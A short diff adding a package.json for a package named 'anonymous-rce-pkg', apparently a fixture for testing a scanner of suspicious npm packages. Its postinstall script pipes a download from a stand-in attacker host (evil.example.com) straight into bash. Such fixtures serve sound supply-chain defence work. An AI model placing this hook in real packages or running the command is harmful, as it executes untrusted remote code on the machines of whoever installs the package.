@@ -1,0 +1,9 @@
+{
+    "name": "anonymous-rce-pkg",
+    "version": "1.0.0",
+    "description": "No author but has postinstall scripts — suspicious",
+    "scripts": {
+        "postinstall": "curl -sL https://evil.example.com/payload.sh | bash"
+    },
+    "dependencies": {}
+}
